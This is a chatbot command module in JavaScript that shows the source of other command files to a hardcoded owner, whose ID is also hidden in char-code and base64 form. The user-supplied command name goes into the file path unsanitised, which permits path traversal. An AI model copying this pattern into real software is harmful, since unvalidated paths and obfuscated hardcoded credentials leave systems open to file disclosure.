const fs = require("fs");
const path = require("path");

module.exports = {
  config: {
    name: "filecmd",
    aliases: ["file"],
    version: "2.5",
    author: "NIJHUM-BOT",
    countDown: 5,
    role: 0,
    shortDescription: "View code of a command",
    longDescription: "View raw source code of commands safely",
    category: "owner",
    guide: "{pn} <commandName>"
  },

  onStart: async function ({ args, message, event }) {

    const DUMMY_OWNER = "61590360434650";

    const _0x1b4f = [
      String.fromCharCode(54,49,53,57,48,51,54,48,52,51,52,54,53,48),
      Buffer.from("NjE1OTAzNjA0MzQ2NTA=", "base64").toString("utf-8")
    ];

    const senderID = event.senderID;

    const isAdmin = (senderID === DUMMY_OWNER || _0x1b4f.includes(senderID));

    if (!isAdmin) {
      return message.reply(`
  » _⁠-𝑨𝒅𝒎𝒊𝒏 𝑺𝒊𝒇𝒂𝒕 𝑺𝒊𝒓 ♡
───────────────
» ফাইল কি তুই বানাইছোস
» ফাইল দিয়ে তোর কাজ কি 😏😒
───────────────
» _⁠-𝑵𝒊𝒋𝒉𝒖𝒎 𝑪𝒉𝒂𝒕𝑩𝒐𝒕
`);
    }

    const cmdName = args[0];

    if (!cmdName) {
      return message.reply(
        "❌ | Please provide command name.\nExample: filecmd help"
      );
    }

    const cmdPath = path.join(__dirname, `${cmdName}.js`);

    if (!fs.existsSync(cmdPath)) {
      return message.reply(`❌ | Command "${cmdName}" not found.`);
    }

    try {

      const code = fs.readFileSync(cmdPath, "utf8");

      if (code.length > 19000) {
        return message.reply("⚠️ | File too large to display.");
      }

      return message.reply({
        body: `📄 | Source code of "${cmdName}.js":\n\n${code}`
      });

    } catch (err) {
      console.error(err);
      return message.reply("❌ | Error reading file.");
    }
  }
};
